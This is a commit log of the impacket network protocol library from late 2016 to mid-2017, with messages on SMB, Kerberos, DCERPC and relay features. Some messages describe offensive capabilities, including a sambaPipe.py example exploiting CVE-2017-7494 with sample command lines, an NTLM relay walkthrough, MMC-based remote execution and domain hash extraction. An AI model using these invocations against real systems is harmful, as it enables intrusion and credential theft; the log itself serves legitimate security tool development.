Author: asolino <bethus@gmail.com>
Date:   Thu Jul 6 10:34:36 2017 -0300

    Merge branch 'Gifts-dcerpc_fix'

commit 164788138e2f9ee7356c7fe85f16b166d67e5659
Merge: d285faf2 f9987592
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 6 10:29:58 2017 -0300

    Merge branch 'dcerpc_fix' of https://github.com/Gifts/impacket into Gifts-dcerpc_fix

commit f9987592c285aa555ce9d680aff9585ec87ce037
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Thu Jul 6 16:12:43 2017 +0300

    Fix for ENCODED_STRING class to decode UTF-16 strings

commit d285faf2eaa9d1bc74d9bd096a63e8d4b5756030
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 5 11:59:25 2017 -0300

    Adding SOCKS proxy support for relayed connections
    
    * Use -socks switch when running smbrelayx.py
    * SOCKS4 and SOCKS5 should work
    * Bypass logoff attempts and sends keep alive packets to keep connections open
    * Lots of things to improve, mainly dynamic subscriptions of port handlers so we
    can add protocol handlers easier (e.g. MSSQL, HTTP, etc)
    * Testing needed. Porting to ntlmrelayx.py soon.

commit b92e438044efa888484f64fd36a28fbf61c1338e
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 4 12:17:16 2017 -0300

    Removing debug print

commit 409bf10c11bcd493dfeff21311644b906edda686
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 4 11:33:03 2017 -0300

    Adding echo() method.
    
    * It implements SMB_COM_ECHO functionality

commit c297ce98a4f65de194a58bb6039d19b0e9fcfac5
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 3 21:22:50 2017 -0300

    Setting's LOG to current module's name
    
    * Why? So I can disable that particular module (impacket.smbserver) instead of the whole library.
    * I think I'll do it for all the modules to make it more flexible

commit 09b445bfc4701917b9c1bbc5c23188940144e76b
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 13:05:40 2017 -0300

    Fixing test cases under different scenarios

commit b755ca4d7cd08dea25d717f5bc26291501916caf
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 11:40:25 2017 -0300

    Adding -target-ip switch.
    
    - This allows to specify both the dc-ip and the target-ip. In theory we wouldn't need DNS resolve.
    - Might help addressing https://github.com/CoreSecurity/impacket/issues/285

commit 939e45bbfcb94545b7ff18071e40a7424b7cc940
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 11:38:38 2017 -0300

    Fixes Kerberos TGS request when IPs are manually specified.
    
    - We should use the targetName instead of the targetHost for the TGS request

commit b3826dee41f8dee2477e77b9db302aa335a07ed8
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 09:45:38 2017 -0300

    Print stacktrace messages if DEBUG logging is enabled
    
    - This will make things easier for troubleshooting, for example https://github.com/CoreSecurity/impacket/issues/285

commit 61ef43edc0080ab9aabab83c123146753fed6369
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 19 10:57:48 2017 -0300

    Adding support for ncacn_http in hept_map

commit 74058cc0f03f4cfdd165da5bdf1fc6f8f04daaee
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 15 18:10:11 2017 -0300

    Support for RPC_IN_DATA / RPC_OUT_DATA requests (ncacn_http DCERPC transport).
    
    * RelayServer runs: ./ntlmrelayx.py -t <targetServer>  (optionally add -i and interactive shells will be available)
    * Victim runs: rpcping -s <relayServer> -t ncacn_http -u 10 -a connect -H 2
    * TargetServer: profit
    
    Testing needed!

commit 371a9a80c867d7db17b09cb5b080686dda0a0761
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 15 13:46:15 2017 -0300

    First try at supporting RPC_IN_DATA / RPC_OUT_DATA
    
    * Testing needed.. Might break things
    * Whenever it's ready I'll add it to ntlmrelayx.py

commit b7813a917f9ade3fa8674d7066a69752d827be2f
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 14 12:23:19 2017 -0300

    Increasing wait time when deleting files

commit ea0b341ad18466b42242be1e32486177f76b2cbc
Merge: d01b27cf 0a78476e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 12 13:01:09 2017 -0300

    Merge pull request #281 from fox-it/ntlmrelayx-targets
    
    Improved SMB server target processing and LDAP client error handling

commit d01b27cf2abc130805e3d9d1abea163a7ec09e1c
Merge: 66a02c8e 179b3dd8
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 12 12:59:29 2017 -0300

    Merge branch 'Fr0stbyt3-master'

commit 0a78476e3b2a6b0054205a799631f852b532e87f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Jun 11 12:30:44 2017 +0200

    Improved SMB server target processing and LDAP client error handling

commit 179b3dd82fc68fe601f30f260c501a6872d6ad16
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:22:04 2017 -0400

    Minor adjustments

commit 024c80179c35b08f0689a272e7e60eae03b2b6bc
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:15:35 2017 -0400

    Fixed typo

commit 149f5022132db3a05c79c3a3f6e894c3eb4a10bc
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:13:05 2017 -0400

    Added definitions for SMB 3.0.2 and SMB 3.1.1 dialects, added definition for the SMB2_SEC_INFO_00 infoLevel, added struct for use in responding to SMB2_SEC_INFO_00 queries

commit 66a02c8ed37250b501089f3ecf4e12bd9be3dea6
Author: asolino <bethus@gmail.com>
Date:   Sat Jun 10 11:48:56 2017 -0300

    Building a TargetsProcessor class when it was not specified (e.g. REFLECTION mode)
    
    * Now it default to reflecting back to SMB
    * It should address https://github.com/CoreSecurity/impacket/issues/278

commit a5af417c70c6fe0aca964cb584b8f80338135ef4
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 9 12:04:39 2017 -0300

    Changing default encoding if -codec if not specified
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/260

commit 5f8f84e9487f349f3d538b573e381add117263b5
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 9 11:16:45 2017 -0300

    Better (hopefully) codec support

commit 287cb2fe2cf76c80f551a70ccf0e00e3c8ccc085
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 7 16:27:40 2017 -0300

    Support for samba 3.5.x
    
    * In those versions, the first byte is stripped, hence we're sending a '/' extra at the beginning of the buffer
    * Doesn't seem to affect 4.x versions
    * Also, have in mind that in 3.5.x you need to create a .so exporting init_samba_module(), whereas in 4.x it is samba_init_module()

commit 533413049640d275f5d4080c7a921c39a0e2dc43
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 7 12:31:15 2017 -0300

    Adding pyreadline only when install platform is Windows
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/261

commit 78dfa8ca893c472c99336004e5f25eaf9fad0836
Merge: 9733943d ae741379
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:49:24 2017 -0300

    Merge branch 'franferrax-master'

commit ae741379dc02e68e3d2a431a0d3ba93fc33926db
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:48:28 2017 -0300

    Let's raise an exception if the provided resume file does not exist

commit 0bee4c85514a38d2c44e502a4737411fde59ed39
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:38:06 2017 -0300

    No need to open a file know we have to resumeData
    
    * After that, we'll need to open the file twice since we need to have it wb+ at the end.

commit 065aae679512a8a7b153c256aaa85bef482f38ac
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:03:29 2017 -0300

    Fixes small bugs in new resume class refactor
    
    * We need self.__resumeFile to point to something not None when resuming a session
    * truncate() doesn't work if you open the file with 'r' (at least in macOS)

commit 717cd675e6558f4ca2c8189182cb853d3c904f0c
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:44:26 2017 -0300

    Resume file encapsulated in ResumeSessionMgrInFile class, more flexibility as we can now pass an external manager for the session. No interface changes for NTDSHashes class clients (except for the optional resumeSessionMgr parameter).

commit 1ca1885f397fef44f2bf34868f5c4e46220df126
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:38:23 2017 -0300

    Decide if we can perform a remote operation depending on the provided __remoteOps capabilities.

commit af46638c0b4b1f2e904faaa7212f1fb6ab1b69d2
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:36:34 2017 -0300

    Independent __perSecretCallback for LSA RAW secrets.

commit 9733943d589d3438efe2d09f2c7425dfce67e900
Author: asolino <bethus@gmail.com>
Date:   Sat Jun 3 19:29:26 2017 -0300

    Adding -exec-method
    
    * Allows to chose different exec methods when -use-vss mode is chosen:
    1. smbexec (default): Creates a service executing the desired commands
    2. wmiexec: Executes commands through Win32Process.Create() API
    3. mmcexec: Executes commands through DCOM MMC object (Kerberos not supported here)

commit ea6df99e49ba08651ab537f870f4e2128c7ca95f
Author: asolino <bethus@gmail.com>
Date:   Tue May 30 22:18:23 2017 -0300

    Opening the file as binary to make Windows happy
    
    * Thanks @gentilkiwi for the tests
    * More verbose message when receiving the answer from the server

commit aa23896d95c76b4ede751bf3ae3e9d0a6d94935d
Author: asolino <bethus@gmail.com>
Date:   Tue May 30 18:00:55 2017 -0300

    If no command is specified we should exit.
    
    * There's no interactive shell with this script. Command is needed

commit 32e71ef2369b10d8eaf2cf5a909252727e21f82d
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 15:48:41 2017 -0300

    Adding sambaPipe example
    
    This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through
    the -so parameter.
    
    The script will use SMB1 or SMB2/3 depending on the target's availability. Also, the target share pathname is
    retrieved by using NetrShareEnum() API with info level 2.
    
    Example:
    
    ./sambaPipe.py -so poc/libpoc.linux64.so bill@10.90.1.1
    
    It will upload the libpoc.linux64.so file located in the poc directory against the target 10.90.1.1. The username
    to use for authentication will be 'bill' and the password will be asked.
    
    ./sambaPipe.py -so poc/libpoc.linux64.so 10.90.1.1
    
    Same as before, but anonymous authentication will be used.

commit ee57caec3313a253fb0b18c48502a2c4cde7d6cc
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 13:25:51 2017 -0300

    Trying to detect the type of format offered when called with -just-dc-user
    
    Depending on the input received, we need to change the formatOffered before calling
    DRSCrackNames.
    There are some instances when you call -just-dc-user and you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE
    That's because we don't specify the domain for the user (and there might be duplicates)
    Always remember that if you specify a domain, you should specify the NetBIOS domain name,
    not the FQDN. Just for this time. It's confusing I know, but that's how this API works
    
    If you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE try calling the script again with <NetBIOS Domain Name>/<username> format

commit 0f25e86058fa1580e198e94e0c63a5abec1226ea
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 11:24:23 2017 -0300

    Enhancing our way to find if share is writable
    
    * We just try to open the share with write permissions
    * Some cosmetic changes added as well

commit 754ee112e525ec1842115b9001fa5535e31e403d
Author: asolino <bethus@gmail.com>
Date:   Sun May 21 21:37:26 2017 -0300

    Adding AES as a possible cipher for TLS session.
    
    * In case RC4 is not present
    * Should address https://github.com/CoreSecurity/impacket/issues/269, needs checking

commit 6a762a23859d270069cee2ff52d74e6e24c60910
Author: asolino <bethus@gmail.com>
Date:   Fri May 19 12:10:16 2017 -0300

    Fix when checking logging level for printing some debug information

commit 299442fdb73d14941c74eff6b8986c13aa4ffe7a
Author: asolino <bethus@gmail.com>
Date:   Tue May 16 15:08:03 2017 -0300

    Fix for DCE disconnect
    
    * I wasn't checking right if the dce connection needed to be disconnected or not. In theory, if a connection is specified external to the function, we should NOT disconnect it.

commit 61b8487be985ffc6c61950881a556a98eb533a3f
Author: asolino <bethus@gmail.com>
Date:   Mon May 8 20:34:34 2017 -0300

    Initial [MS-DHCPM] Interface implementation
    
    * And testcases

commit 52fad83d8ec950e7d1427bf9a7fd1796134de190
Author: asolino <bethus@gmail.com>
Date:   Mon May 1 07:26:47 2017 -0700

    Fixes SMB Transaction related code
    
    * Missing field in SMBTransaction2Secondary_Parameters structure
    * Wrong pack usage when processing setup bytes for a  SMB_COM_NT_TRANSACT

commit 0cc150e599d1826573505e8ba110bf95bd05e2d7
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 21 12:48:07 2017 -0300

    Setting some parameters as required
    
    * Since they are required ;)

commit 44a436e35309db43927a6c7cadb92dae5e3bdbd2
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 21 12:37:41 2017 -0300

    Quick and dirty fix for 'not' filters and pyasn1-0.2.3
    
    * Until we figure out the main reason
    * In the context of https://github.com/CoreSecurity/impacket/issues/264

commit aa4f1ca597e83ad9be240dfef0aca8292b0004a2
Merge: 8ca4065e 9bb51a30
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 17 12:58:25 2017 -0300

    Merge pull request #263 from fox-it/krbfix
    
    Fix in toTGT with wrong tag

commit 9bb51a305e08699653832fdb6c5bb1ff15d8b51c
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Apr 13 10:52:52 2017 +0200

    Fix in toTGT with wrong tag

commit 8ca4065ed8f29f4b68e67bd7d1da73cc940d5755
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 4 19:54:38 2017 -0300

    Adding AES128_GCM constant

commit cf246b593f58b863e79e93228351c063b2b3e598
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 1 17:08:39 2017 -0400

    Forgot to decode the stdin command received by the user.
    
    * Should address https://github.com/CoreSecurity/impacket/issues/260

commit 4757b0d225f0bcab17195decccab11a45d1c2ea5
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 22 18:21:53 2017 -0300

    Adjusting to univ.Sequence.setComponentByPosition new signature (pyasn1-0.2.3)
    
    * Should address https://github.com/CoreSecurity/impacket/issues/259
    * We should test it doesn't generate any side effect (in theory not)

commit 6b7514a0d8b84948de4adc365866943cb883bbbb
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 21:00:45 2017 -0300

    Using the same SMB Connection when binding to EPM and MIMI
    
    * No need to create two separate ones
    * Fixed a bug in EPM that would disconnect the SMB Server

commit 067c871807156fd072733c651de86c5be3b05354
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 18:26:21 2017 -0300

    Doing epm search thru SMB if possible

commit e9ed12e6aad1fd6300a0c8e0cccd8a4ad23d84e1
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 16:47:35 2017 -0300

    Forgot to switch to Kerberos (in the right way) when -k is specified
    
    * Also, when possible, use ncacn_np

commit f62fc5c3946430374f92404e892f8c48943d411c
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 10:14:05 2017 -0300

    If target server supports SMB >= 3, encrypt packets by default.
    
    * Unless pycrypto experimental is not installed :(

commit b7c35ec9b6624657615ddf0fbca1f5bde2c40ddd
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 19 16:14:22 2017 -0300

    Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi
    
    * Inital version. Several interesting things to add in the future :)

commit 0e80fa91378cf0d293acf4d2978e3f21526d9f4e
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 14 13:13:47 2017 -0300

    Adding getArch.py example
    
    This script will connect against a target (or list of targets) machine/s and gather the OS architecture type
    installed.
    The trick has been discovered many years ago and is actually documented by Microsoft here:
    https://msdn.microsoft.com/en-us/library/cc243948.aspx#Appendix_A_53
    and doesn't require any authentication at all.
    
    Have in mind this trick will *not* work if the target system is running Samba. Don't know what happens with macOS.

commit 763fcc57cc32ed8e4b507ac63f205ab0f502ffd8
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 6 14:49:11 2017 -0300

    Forgot to add this file too to previous commit (https://github.com/CoreSecurity/impacket/commit/b9ec8241b81a0c45cd833e5bed4e2ae708905fe8)

commit b9ec8241b81a0c45cd833e5bed4e2ae708905fe8
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 6 14:42:43 2017 -0300

    Chaning Service Ticket sname if it doesn't match what we want
    
    * It might not work if the ST isn't encrypted for the same user as the new SPN.

commit 0ddd7b140cb0fc6c83e0c83d9ec0f35607d8398e
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 1 18:13:00 2017 -0300

    Adding copyright for 2017

commit 441e91552927286624609501be3ea5384d5ea80e
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 24 11:55:00 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    Especially useful when running this script against non-english systems.
    
    * It can be used also by other protocols, since the encoding chosen is set in the NTLMRelayxConfig instance.
    
    * Adds on top https://github.com/CoreSecurity/impacket/commit/589490d8c8cd2bba10321c8fce9f2e1fa8c3a408#commitcomment-21015813 that was only for smbrelayx.py

commit 7099431abd3ed6fbc3555973cf064484f354938c
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 24 11:10:59 2017 -0300

    Nicer coding :)

commit 07a897fa968dc97f40a5c360a46d728f16ca66e5
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 23 21:52:21 2017 -0300

    Droping int() and str(), not needed.

commit c81404999693a0faa9ac94375e347ba8e9512a0d
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 23 10:21:43 2017 -0300

    Adding support LDAP paged search support to GetADUsers.py
    
    * Will now work when there are more than 1000 records
    * Also fixes a small bug in the library when decoding the cookies

commit 589490d8c8cd2bba10321c8fce9f2e1fa8c3a408
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 22 10:10:55 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    Especially useful when running this script against non-english systems.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/254

commit 8abc3f2e71df4ef4ffdca11a75134fd82a0d2918
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 21 20:15:20 2017 -0300

    Fixed wrong expected values in KDC_REP
    
    * It was triggering a ValueConstraintError with pyasn1-0.2.2 (looks like it now checks that)
    * Updating setup.py as well

commit 6826ececc75debcf37ad8581388798bcfe9eb079
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 21 20:02:11 2017 -0300

    Updating setup.py with the pyasn1 version we know we work against
    
    * Newer versions might not work (0.2.2 does not work)

commit 6c34701623172c64e61e920c59a79a73eeafd7b7
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 20 17:48:26 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    
    Especially useful when running this script against non-english systems.

commit 1e26b895b1da1699c336c30156404eb0ebf8543a
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 20 15:20:27 2017 -0300

    Removing SMB() and SMB3() destructor
    
    * Not needed, replaced by close_session()

commit 17d82cb6a8b9d15d50557a3df159248819d5cb78
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 8 19:22:26 2017 -0300

    Performance improvement in DRSGetNCChanges request
    
    We're now calling DRSCrackNames() with formatDesired DS_UNIQUE_ID_NAME instead of former DS_FQDN_1779_NAME.  DS_UNIQUE_ID_NAME has a fixed size (16) whereas DS_FQDN_1779_NAME is variable (depending on the target domain). This is used when calling DRSGetNCChanges().
    In my tests I'm saving around 20% of the request's size (364 gainst 292 bytes)
    
    Thanks @gentilkiwi for pointing it out :)

commit 92ce1de823a01514ba488e912fa4f50a8e9944c9
Merge: 2f69f933 574e3b42
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 6 11:28:12 2017 -0300

    Merge pull request #250 from skelsec/master
    
    Adding DES-CBC-MD5 support to kerberos

commit 574e3b42a0d877832f667b99d82cef08a9e9b635
Author: skelsec <info@skelsec.com>
Date:   Sun Feb 5 07:35:10 2017 -0800

    Adding DES-CBC-MD5 support to kerberos
    
    yes, it uses string-bit conversion to bit manipulation
    yes, there is possible a better way to deal with DES keys
    yes, it was tested against actual windows servers (2016 and 2008)
    no, I wasn't drunk when writing this

commit 2f69f9330d8dd86b086f3c7f98ad4e4f015c45f6
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 2 15:38:53 2017 -0300

    Typo on Ben's surname
    
    :)

commit 5a6e2475858a6a28991fde0a99085e0bb05a6c80
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 2 11:40:54 2017 -0300

    Adding getPac.py example
    
    This script will get the PAC of the specified target user just having a normal authenticated user credentials.
    It does so by using a mix of [MS-SFU]'s S4USelf + User to User Kerberos Authentication.
    Original idea (or accidental discovery :) ) of adding U2U capabilities inside a S4USelf by Benjamin Delphi (@gentilkiwi)
    
    References:
    
    U2U: https://tools.ietf.org/html/draft-ietf-cat-user2user-02
    [MS-SFU]: https://msdn.microsoft.com/en-us/library/cc246071.aspx

commit 03c5bc63bc8bf98cff84770f1231a0922fcbebab
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 25 09:35:09 2017 -0300

    Giving some hints when target is enforcing SPN validation

commit f0b5b8f6174ba9cfebef66d1bdaab8a776773c61
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 24 16:10:29 2017 -0300

    Be more flexible about the target SPN to use
    
    * When connecting to target systems
    * Also, don't give up if the SMBConnection didn't work, we might be still lucky at the DRSUAPI layer

commit 6a49832e2b8fad4e5238b7d35bc8eb057e31eef8
Author: martin_uy <m@rtin.uy>
Date:   Mon Jan 23 18:56:32 2017 -0300

    In the context of #69:
     * Import missing

commit 37e40a732e5592b43f5678ef8e8bed7ffff66e81
Author: martin_uy <m@rtin.uy>
Date:   Mon Jan 23 18:53:32 2017 -0300

    In the context of Issue #69:
     * IPv6 interface aligned to IPv4 interface.

commit f2d6f634d20cab10db9635e95f2398ba3e65943f
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 20 12:32:03 2017 -0300

    Retrieve the username based on the specific TGT/TGS retrieved from ccache
    
    * In the case where there is more than a single ticket, there could be different client names. Especially if there are tickets with delegation
    * Improved debug info to identify mismatches in the future

commit dbc38254154e7fb44357d2bebaad27d912e69fb0
Merge: ccdb867b 4f5154ab
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Mon Jan 16 08:35:39 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit 4f5154ab2602cf5e9d5da993324def1cd78538d2
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 15 17:03:34 2017 -0300

    Include 'KRB5 - Kerberos 5' OID inside the GSSAPI MechToken
    
    * We were just including the mechTypes, but looks like it is also needed inside the MechToken
    * Windows doesn't care about it, but Samba / NetApp servers do.
    * Should address https://github.com/CoreSecurity/impacket/issues/247

commit fb280b1213b505b5dba4ce6f9099be28cfe489ad
Merge: 1a12a2d8 a86c480d
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:24:01 2017 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 1a12a2d88f3f63c39c765c9fa6373818c50cda00
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:23:43 2017 -0300

    In the context of merging pull request #92, we removed the code on UDP decoder that does DHCP decoding based on port numbers. Even though it's a valid heuristic to determine the layer following UDP based on port numbers -and it's going to work in most of the cases, as DHCP services usually run on a well known port that it's not used for any other protocols-, we still want to handle the cases in which those well known ports are used for a different protocol. In this later case, the decoder has to be DataDecoder instead of DHCP Decoder. As a result, is up to the ImpactDecoder client to decide which decoder has to be used for the layers following UDP or TCP, as there is not an unambiguous way of determining that.

commit e978eca9e2b3d455ca73b8291772746e5fa41075
Merge: 0ff281f0 9879f1b6
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:12:43 2017 -0300

    Merge branch 'c0d3z3r0-feature/dhcp'

commit 9879f1b676e0620b4a1b2e95e71e64d29f8290cc
Merge: 0ff281f0 c8aabf28
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:12:19 2017 -0300

    Merge branch 'feature/dhcp' of https://github.com/c0d3z3r0/impacket into c0d3z3r0-feature/dhcp

commit ccdb867b9884af1cbf790f174180e6c90d9c6c91
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Wed Jan 11 15:13:11 2017 -0500

    https://github.com/CoreSecurity/impacket/issues/236
    
    SessionError exception not populating packet info in SMBConnection
    wrapper.

commit 517a1748b467c418d0918d5fc8f457aa0525b4bf
Merge: f78c5e17 a86c480d
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Wed Jan 11 14:39:55 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit a86c480d64f84ca2b6944068f82119a39e5f049d
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 13:24:14 2017 -0300

    Restoring commented structure items
    
    * Problem wasn't padding related (thanks god) for a definition of an EMPTY NDR structure.

commit fc65d6b475c077806493028d6ae4bdd71e321824
Merge: e5b1968a 6ca48d58
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:56:13 2017 -0300

    Merge branch 'martingalloar-virtualenv-friendly'

commit 6ca48d58abafc2816696549f0b06157eda982b1c
Merge: e5b1968a 4152e128
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:55:35 2017 -0300

    Merge branch 'virtualenv-friendly' of https://github.com/martingalloar/impacket into martingalloar-virtualenv-friendly

commit 4152e128b8c1e435f04eb88775c290a86ebf266d
Author: Martin Gallo <mgallo@coresecurity.com>
Date:   Wed Jan 11 12:43:54 2017 -0300

    Replaced shebang with a virtualenv friendly one
    
    Replaced all instances of `#!/usr/bin/python` with `#!/usr/bin/env python` so impacket's examples and scripts can be run inside a virtualenv without having to call python.

commit e5b1968abcf2ed8cad2eef6d38531cc38ad98baa
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:42:11 2017 -0300

    VARIANT is already a pointer
    
    * Might solve https://github.com/CoreSecurity/impacket/issues/245. Testing needed

commit ea9f61d02ee4bb742313c2b90f6fb8bb7b237266
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 23:15:41 2017 -0300

    Quitting MMC when executing a single command from command-line
    
    * mmc.exe was still running at the target server

commit f4596a1b03e28eac4006288d07fd7c0662c29acf
Merge: a0f5bd26 0ff281f0
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 21:24:23 2017 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit a0f5bd265df61d1ba89901f93435eeb71242f045
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 21:23:22 2017 -0300

    Adding mmcexec.py example
    
    A similar approach to wmiexec but executing commands through MMC.
    
    Original discovery by Matt Nelson (@enigma0x3):
    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

commit 0ff281f00e2f563a8d5b68ef46ed375067d21fea
Author: martin_uy <m@rtin.uy>
Date:   Tue Jan 10 13:44:24 2017 -0300

    In the context of #244:
    
     * We are now cleaning up open files from the corresponding session structure in SMB3 when disconnecting from a tree.

commit aa1158726b75a74f62f76f8fde674547bd201ad6
Merge: 0ec5c1f0 72b5c5ce
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 9 15:28:56 2017 -0300

    Merge branch 'contactr2m-smb_com_nt_transact'

commit 72b5c5ce7894caac80539377596efb5cfdb163ed
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Fri Jan 6 13:05:19 2017 -0500

    Add support for SMB_COM_NT_TRANSACT and NT_TRANSACT_QUERY_SECURITY_DESC
    
    [MS-CIFS]: 2.2.4.62.1 SMB_COM_NT_TRANSACT request.
    [MS-CIFS]: 2.2.7.6.1 NT_TRANSACT_QUERY_SECURITY_DESC

commit f78c5e1731ceeafaaa9870a4b1b381e8ad1ddf20
Merge: 268a79a6 4c2a5b98
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Fri Jan 6 11:14:50 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit 4c2a5b98e54046e3dc65ce5410c35b63f27e4a70
Author: martin_uy <m@rtin.uy>
Date:   Tue Dec 27 13:49:51 2016 -0300

    In the context of #241:
     * The VCNumber field in a SMB_COM_SESSION_SETUP_ANDX binary packet (SMB login standard) is 2 bytes long. Truncate the os.getpid value if greater than 2 bytes.

commit 0ec5c1f0269415f54ff3cacfd6c495377e16b1bd
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 27 10:57:25 2016 -0300

    Adding SMBConnection.close()
    
    * Committing patch by @martinuy
    * Logs off and closes the underlying socket.
    * Should fix https://github.com/CoreSecurity/impacket/issues/227

commit c0610ef0c23cfcadaa8c861bc79089abc4400390
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 26 09:36:07 2016 -0300

    Hexdump for LSA Secrets not printed, if callback set
    
    * Small little trick to verify callback was not set (if there's a better way let me know)
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/240

commit d910f375973d5fff048cd12be720012b6b0a7be4
Merge: 2e9c5c2f ddf172bb
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Dec 12 10:24:44 2016 -0300

    Merge pull request #239 from CoreSecurity/dhcpoptions
    
    Adding 'default-url' to the dhcp options list.

commit ddf172bb13ace50794209f0603293b06bae1e127
Author: jgermano <jigermano@gmail.com>
Date:   Mon Dec 12 10:13:39 2016 -0300

    Adding 'default-url' to the dhcp options list. While not defined in any RFC, is assigned by IANA and accepted by, at least, Linux's dhclient.

commit 2e9c5c2f30b5fefb52c3db7f194ec57e7fbc31e6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 15:25:55 2016 -0300

